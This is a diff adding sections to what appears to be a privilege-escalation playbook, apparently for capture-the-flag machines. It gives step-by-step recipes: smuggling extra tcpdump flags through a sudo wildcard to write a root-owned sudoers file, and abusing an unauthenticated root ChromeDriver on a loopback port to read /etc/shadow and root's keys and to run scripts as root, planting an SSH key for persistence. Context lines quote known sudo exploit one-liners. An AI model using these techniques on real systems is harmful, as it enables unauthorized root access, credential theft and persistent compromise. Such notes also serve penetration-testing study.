@@ -102,6 +102,28 @@ the security context rather than the output:
 The escalation here is a *documented feature* of the allowed binary, so nothing
 looks anomalous. When you write it up, name the wildcard as the vulnerability,
 not the runtime.
+
+**A `*` *anywhere* in the rule — even mid-argument, meant to match a path segment
+— matches spaces, so it lets you inject entire extra flags, not just widen one
+path.** sudo matches the whole command line with `fnmatch`, and `*` is greedy
+across ` `. A rule that looks locked down to specific option *values* —
+`tcpdump -c10 -w/dir/*/<uuid-charclass> -F/dir/filter.<uuid-charclass>` — is still
+wide open: `-w/dir/a/ -Z root -r evil.pcap -w /real/target/<uuid> -F/dir/filter.<uuid>`
+matches, because the first `*` swallows ` -Z root -r evil.pcap -w /real/target`.
+The method: keep the fixed head and tail the pattern demands, and smuggle the
+dangerous flags in the middle where a `*` sits. Then pick the flags that change
+*who owns the output* or *what the tool reads/writes* — for `tcpdump`: `-Z <user>`
+(write the savefile owned by any user, e.g. root — defeats the priv-drop that
+otherwise makes `cron.d`/`sudoers.d` reject a `tcpdump`-owned file), a second
+`-w` (the last one wins → real target), `-r <pcap>` (read attacker-controlled
+bytes instead of live traffic), `-V <file>` (read a list of filenames from a
+file → arbitrary file *read*, leaked in the error). Craft the payload bytes as a
+pcap: `tcpdump -w x.pcap -c1 -i lo -A udp port N &` then `printf '\n\n<line>\n' |
+nc -u -w1 127.0.0.1 N`, and drop a root-owned `/etc/sudoers.d/<uuid>` (visudo
+tolerates the pcap junk on line 1 and applies your rule on the next). Don't
+conclude a constrained `-w`+priv-drop is a dead end before testing flag injection
+through the wildcard.
+
 `(ALL, !root)` in older sudo → CVE-2019-14287, `sudo -u#-1 /bin/bash`.
 Sudo `< 1.9.5p2` → Baron Samedit (CVE-2021-3156), a heap overflow reachable with
 **no sudo rights at all** (`sudoedit -s '\' $(perl -e 'print "A"x1000')` to
@@ -340,6 +362,25 @@ CCTV/monitoring UI where the request signature key is the readable admin-passwor
 hash and a "command notification" field is appended to the capture daemon's
 `on_event_start`. Pin the version, read the verifier and the config mapping,
 choose the sink — never memorise one product's recipe.
+
+**A browser-automation server (ChromeDriver/Selenium, geckodriver, Playwright)
+running as root on a loopback port is local root — two primitives, both plain
+unauthenticated HTTP to the port** (WebDriver/CDP has no auth by design; default
+ports 9515 chromedriver / 4444 selenium). Find it with the loopback-port + UID-0
+sweep above.
+- *Arbitrary read as root:* create a session
+  (`{"goog:chromeOptions":{"args":["--headless=new","--no-sandbox"]}}` — root
+  Chrome refuses the sandbox), `POST /session/<id>/url {"url":"file:///root/…"}`,
+  then `GET /session/<id>/source` — the page source is the file, read with root's
+  rights. Reads `root.txt`, `/etc/shadow`, root's keys.
+- *Arbitrary execution as root:* ChromeDriver execs whatever
+  `goog:chromeOptions.binary` names, **as root**. Point it at a script you own
+  (`{"binary":"/dev/shm/x.sh","args":["--headless"]}`); the session creation
+  "fails" because your script isn't a browser, but the script already ran.
+  **Prefer dropping a key into `/root/.ssh/authorized_keys` over a SUID copy** —
+  `/tmp` and `/dev/shm` are frequently `nosuid`, which silently neutralises a
+  SUID `bash` (the bit is set, `id` still shows your uid). Drive it as `dev` with
+  `urllib` straight to `127.0.0.1:9515`; no tunnel needed once you have a shell.
 
 ## Password reuse
 
